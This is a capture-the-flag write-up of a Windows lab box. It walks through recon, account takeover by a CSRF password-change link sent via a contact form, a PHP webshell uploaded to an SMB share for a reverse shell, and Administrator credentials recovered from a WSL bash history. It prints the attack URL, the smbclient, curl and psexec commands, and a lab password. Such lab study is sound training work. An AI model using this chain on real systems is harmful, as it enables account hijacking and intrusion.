# Secnotes — Medium — Windows

**Date:** 18 - Aug - 2026

---
## Tags

`#windows` `#web` `#csrf` `#php` `#smb` `#webshell` `#wsl` `#bash-history` `#credential-disclosure` `#privesc`

---

## What I Know

| Item       | Detail                                                                                   |
| ---------- | ---------------------------------------------------------------------------------------- |
| Target     | 10.129.51.27 (host: SECNOTES)                                                             |
| OS         | Windows 10 Enterprise 17134                                                               |
| Open ports | 80, 445, 8808                                                                             |
| Services   | IIS 10.0 / Secure Notes PHP app (80); SMB (445); IIS 10.0 secondary site (8808)          |
| Foothold   | CSRF on `change_pass.php` (GET, no token) → take over `tyler` → SMB creds → webshell RCE  |
| User       | `tyler` (webshell on the 8808-backed writable share) → user.txt                          |
| Privesc    | WSL `bash.exe` (default user root) → `/root/.bash_history` leaks Administrator SMB creds   |
| Flags      | user.txt as tyler; root.txt via Administrator over SMB (C$)                               |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.51.27
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-19 21:53 +0100
Nmap scan report for 10.129.51.27
Host is up (0.020s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 66.33 seconds
```

<img width="858" height="339" alt="image" src="https://github.com/user-attachments/assets/b6c39b1d-f202-4889-99f2-3819a633336f" />

```
nmap -sC -sV -p80,445,8808 10.129.51.27
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-19 21:55 +0100
Nmap scan report for 10.129.51.27
Host is up (0.016s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   Computer name: SECNOTES
|_  Workgroup: HTB
| smb-security-mode:
|_  message_signing: disabled (dangerous, but default)

Nmap done: 1 IP address (1 host up) scanned in 53.26 seconds
```

<img width="1200" height="1116" alt="image" src="https://github.com/user-attachments/assets/ecb9a8b4-097e-404c-bee4-2f9bbdf7d7ed" />

**What each port tells me:**
- **Port 80 (HTTP)** — IIS serving a "Secure Notes" PHP login app. Main entry point.
- **Port 445 (SMB)** — File-sharing surface; likely where recovered creds get used.
- **Port 8808 (HTTP)** — A second IIS site (default page for now); worth investigating, especially if a share feeds it.

---
## Enumeration Log

```
OBSERVATION:
- Port 80 is a login page. admin:admin failed, but registration works, I made a dummy user
  and logged in
- The app has 4 features: create note, change password, sign out, contact us. A banner reads
  "contact tyler@secnotes.htb", so tyler is likely a privileged/target user
- SMB: no anonymous login
- Port 8808: default IIS page
WHAT IT TELLS ME:
- I need tyler's credentials, likely reusable on SMB and/or hiding sensitive notes
WHAT I AM GOING TO TRY:
- Dir-fuzz both web apps for hidden/sensitive paths
- Probe the change-password flow for missing anti-CSRF protections so I can change tyler's
  password to one I control
WHY:
- Credentials are the win here (usable on the app and SMB); a weak password-change flow lets
  me hijack tyler's account
RESULT:
- Dir-fuzz on both apps: nothing useful
- The change-password flow lacks CSRF defences: no current-password prompt and no CSRF token.
  It also accepts the request as a GET (not just POST)
- So a crafted GET URL that changes the password, if opened by tyler while logged in, will
  carry tyler's session cookie and change tyler's password to my value
- Delivery: the "Contact us" form messages tyler. I tested it by sending a link to a python
  http server on my box and got a callback, confirming tyler opens submitted links
- Sent the password-change GET URL via Contact us; logged in as tyler with my new password
- A note in tyler's account held SMB credentials (\\secnotes.htb\new-site). Logged into SMB
  as tyler, the share hosts the port-8808 site, so a file dropped here is reachable via that
  web server
- Uploaded a PHP webshell (plus nc.exe) to the share and requested it via http://<ip>:8808/,
  triggering a reverse shell as tyler → read user.txt
WHAT NEXT:
- Enumerate as tyler for a path to Administrator
```

<img width="664" height="497" alt="image" src="https://github.com/user-attachments/assets/82a20726-8455-4a96-9a7a-6af6d78c24bf" />

<img width="515" height="609" alt="image" src="https://github.com/user-attachments/assets/eb0f8a4c-2751-4d28-9c81-bd6c869757de" />

<img width="1698" height="608" alt="image" src="https://github.com/user-attachments/assets/9a1a88fe-ae80-40f2-ab32-f020f8defc4c" />

<img width="645" height="113" alt="image" src="https://github.com/user-attachments/assets/04a7c3bd-dd54-457c-892a-de151d66e713" />

<img width="1756" height="790" alt="image" src="https://github.com/user-attachments/assets/0f43ce5b-2891-4269-b67f-da22b800cd74" />

<img width="751" height="492" alt="image" src="https://github.com/user-attachments/assets/520398ef-6472-4e9a-a6f8-213c5d78dd58" />

<img width="1169" height="528" alt="image" src="https://github.com/user-attachments/assets/9846791e-5832-42de-a30a-b806c475fd0c" />

<img width="2104" height="596" alt="image" src="https://github.com/user-attachments/assets/2bed7100-a6c1-4c4c-a02c-03ae4848dca3" />

<img width="853" height="455" alt="image" src="https://github.com/user-attachments/assets/d115b367-1bd2-41b9-8bfb-ee17c381c634" />

<img width="1144" height="178" alt="image" src="https://github.com/user-attachments/assets/54656204-8e1d-435f-80e0-a95927710112" />

<img width="868" height="591" alt="image" src="https://github.com/user-attachments/assets/dd772c10-6a83-4b69-9f58-59bf499f2a00" />

<img width="2405" height="1173" alt="image" src="https://github.com/user-attachments/assets/5132010c-18e1-4ec2-8848-c2a5d5006c9f" />

<img width="1007" height="630" alt="image" src="https://github.com/user-attachments/assets/18eab983-3e14-4dbf-aca2-8e6d23c76772" />

<img width="797" height="129" alt="image" src="https://github.com/user-attachments/assets/eecb2256-d23a-4921-9cfd-3cac7b8a5a1b" />

<img width="1026" height="368" alt="image" src="https://github.com/user-attachments/assets/08549c4f-6a05-42a6-9430-094e4632d3a3" />

<img width="820" height="1172" alt="image" src="https://github.com/user-attachments/assets/46e35dae-c715-41e1-86da-53ebeaa2b5b6" />

```
OBSERVATION:
- linpeas as tyler flagged "Linux shells/distributions wsl.exe, bash.exe",  WSL is installed
- Found bash.exe at
  C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
WHAT IT TELLS ME:
- Running bash.exe drops me into the WSL Linux distro. On this box WSL's default user is root,
  so I get a root shell INSIDE the distro (this is WSL-root, not Windows Administrator/SYSTEM)
WHAT I AM GOING TO TRY:
- Run bash.exe, then read the distro's history/config files for secrets
WHY:
- WSL-root can read the distro's /root files; history files often contain typed credentials
RESULT:
- As WSL-root, /root/.bash_history contained a cleartext smbclient command with the real
  Administrator's SMB password (administrator%<password>)
- Reused those creds over SMB as Administrator (\\10.129.51.27\c$) and read root.txt from the
  Administrator Desktop. (The same creds also give a full Administrator shell via
  psexec/winexe/wmiexec)

```

<img width="1775" height="344" alt="image" src="https://github.com/user-attachments/assets/2fde8dbb-482f-42b7-90e2-04a08b7c5dcf" />

<img width="1738" height="565" alt="image" src="https://github.com/user-attachments/assets/b811d013-4ca7-4cc9-8f47-d29e0d5224d5" />

<img width="923" height="578" alt="image" src="https://github.com/user-attachments/assets/abd8de15-4562-4a6c-bfc3-7075b006124d" />

<img width="1015" height="848" alt="image" src="https://github.com/user-attachments/assets/7c266074-0a39-48e3-9b7b-a0980cff97bb" />

---

## Foothold

**How I got in:** The Secure Notes app let me self-register. Its `change_pass.php` had no anti-CSRF protection, no current-password check, no CSRF token, and it even accepted the change as a **GET** request. Since the "Contact us" form delivers links to **tyler** (who opens them while authenticated), I sent a crafted password-change GET URL through it, hijacking tyler's account via **CSRF**. A note in tyler's account held **SMB credentials** for a writable share (`\\secnotes.htb\new-site`) that backs the port-8808 site, so I uploaded a **PHP webshell** to the share and triggered it over `:8808` for RCE as **tyler**.

**Command / exploit used:**

```
# CSRF: deliver this GET via the Contact-us form so tyler's session executes it
http://10.129.51.27/change_pass.php?password=Pwned123!&confirm_password=Pwned123!&submit=submit
# → log in as tyler; a note reveals SMB creds  tyler:92g!mA8BGjOirkL%OG*&

# write a webshell to the 8808-backed share, then trigger it
smbclient \\\\10.129.51.27\\new-site -U tyler
smb> put shell.php
curl "http://10.129.51.27:8808/shell.php?cmd=..."     # → reverse shell as tyler → user.txt
```

**Why it worked:** The password-change endpoint trusted the session cookie alone, with no CSRF token and no re-authentication, and accepted state-changing requests over GET, so a single attacker-crafted link opened by an authenticated tyler silently changed his password. From there, credential reuse chained cleanly: tyler's note-stored SMB creds gave write access to a share that a second web server serves, collapsing "upload a file" into "execute code."

---

## Privilege Escalation

**Path taken (tyler → Administrator):** As tyler, linpeas showed **WSL** installed. Running `bash.exe` dropped me into the Linux distro, whose **default user is root**, so I had a root shell *inside WSL* (not Windows Administrator). That WSL-root could read `/root/.bash_history`, which contained a cleartext `smbclient` command including the **real Administrator's SMB password**. I reused those credentials over SMB as Administrator and read root.txt from the Administrator Desktop (the same creds also yield a full Administrator shell via psexec/winexe).

**Command / exploit used:**

```
# drop into WSL (default user root) and read the history file
C:\Windows\System32\bash.exe
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat /root/.bash_history        # → smbclient ... administrator%<password>

# reuse the Administrator creds over SMB (flag from C$), or get a full shell
smbclient \\\\10.129.51.27\\c$ -U administrator      # → root.txt
# impacket-psexec administrator@10.129.51.27          # → Administrator shell
```

**Why it worked:** This box had WSL installed with the distro's default user set to **root**, so any shell that launches `bash.exe`/`wsl.exe` is root *within the Linux subsystem*. That alone isn't Windows privilege, the actual escalation is **credential disclosure**: someone had previously typed an `smbclient` command containing the Administrator password, and it persisted in `/root/.bash_history`. Because that Administrator password was valid for Windows SMB, reusing it granted genuine Administrator access to the host. The lesson is that secrets typed into any shell (even a "throwaway" WSL one) linger in history files.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Hijacked tyler's account with a CSRF password-change link (GET, no token) delivered via the contact form, used his note-stored SMB creds to upload a PHP webshell to the port-8808 share, and got RCE as tyler.
2. **Privesc technique in one sentence:** Launched WSL `bash.exe` (default user root) and recovered the real Administrator's SMB password from `/root/.bash_history`, then reused it for Administrator access and root.txt.
